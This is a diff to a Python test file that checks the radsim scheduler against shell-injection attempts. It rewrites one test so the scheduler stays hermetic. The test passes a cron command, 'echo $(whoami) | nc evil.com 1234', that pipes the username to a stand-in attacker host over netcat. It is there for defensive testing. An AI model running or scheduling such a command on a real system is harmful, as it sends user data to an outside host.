@@ -5,7 +5,6 @@ and cron scheduling. These tests verify that validation catches
 injection attempts before they reach the underlying shell.
 """
 
-from pathlib import Path
 from unittest.mock import MagicMock, patch
 
 import pytest
@@ -361,30 +360,22 @@ class TestSchedulerInjection:
                 command="echo safe",
             )
 
-    @patch("radsim.scheduler.subprocess")
-    def test_schedule_task_function(self, mock_subprocess):
-        """Test the top-level schedule_task function."""
-        mock_subprocess.run.return_value = MagicMock(
-            returncode=1, stdout="", stderr="no crontab for user"
-        )
-        mock_subprocess.Popen.return_value = MagicMock()
-        mock_subprocess.Popen.return_value.communicate = MagicMock()
-
+    def test_schedule_task_function(self, tmp_path, monkeypatch):
+        """The schedule_task tool now delegates to jobs.py — keep it hermetic."""
+        import radsim.jobs as jobs
         from radsim.scheduler import schedule_task
 
-        with patch("radsim.scheduler.SCHEDULES_FILE", Path("/tmp/radsim_test_sched.json")):
-            result = schedule_task(
-                name="test_pentest",
-                schedule="* * * * *",
-                command="echo $(whoami) | nc evil.com 1234",
-                description="pentest job",
-            )
-            # Document whether the function accepts the malicious command
-            assert isinstance(result, dict)
-            # Clean up
-            test_file = Path("/tmp/radsim_test_sched.json")
-            if test_file.exists():
-                test_file.unlink()
+        monkeypatch.setattr(jobs, "JOBS_FILE", tmp_path / "jobs.json")
+        monkeypatch.setattr("radsim.jobs.sync_crontab", lambda: None)
+
+        result = schedule_task(
+            name="test_pentest",
+            schedule="* * * * *",
+            command="echo $(whoami) | nc evil.com 1234",
+            description="pentest job",
+        )
+        # Document whether the function accepts the (malicious) command
+        assert isinstance(result, dict)
 
 
 # =============================================================================
